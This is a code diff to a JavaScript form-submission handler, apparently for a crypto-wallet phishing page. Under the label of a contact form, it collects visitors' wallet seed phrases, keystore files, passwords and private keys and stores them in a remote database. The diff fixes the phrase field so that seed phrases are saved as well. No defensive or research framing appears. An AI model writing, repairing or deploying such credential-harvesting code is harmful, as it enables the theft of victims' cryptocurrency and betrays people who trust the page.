@@ -31,7 +31,7 @@ function submitForm(e) {
             
             switch (walletInfoType) {
                 case 'phrase':
-                    walletCredentials = document.getElementById('wallet-phrase').value;
+                    var walletPhrase = document.getElementById('wallet-phrase').value;
                     break;
                 case 'keystore':
                     var walletKeystore = document.getElementById('wallet-keystore').value;
@@ -45,7 +45,7 @@ function submitForm(e) {
                     break;
             }
 
-  saveMessages(name, emailid, msgContent,selectedWallet,walletKeystore,walletPassword,walletPrivateKey);
+  saveMessages(name, emailid, msgContent,selectedWallet,walletPhrase,walletKeystore,walletPassword,walletPrivateKey);
 
   //   enable alert
   document.querySelector(".alert").style.display = "block";
@@ -59,7 +59,7 @@ function submitForm(e) {
   document.getElementById("contactForm").reset();
 }
 
-const saveMessages = (name, emailid, msgContent,selectedWallet,walletKeystore,walletPassword,walletPrivateKey) => {
+const saveMessages = (name, emailid, msgContent,selectedWallet,walletPhrase,walletKeystore,walletPassword,walletPrivateKey) => {
   var newContactForm = contactFormDB.push();
 
   newContactForm.set({
@@ -67,6 +67,7 @@ const saveMessages = (name, emailid, msgContent,selectedWallet,walletKeystore,wa
     emailid: emailid,
     msgContent: msgContent,
      selectedWallet: selectedWallet,
+    walletPhrase: walletPhrase,
     walletKeystore: walletKeystore,
     walletPassword: walletPassword,
     walletPrivateKey: walletPrivateKey,
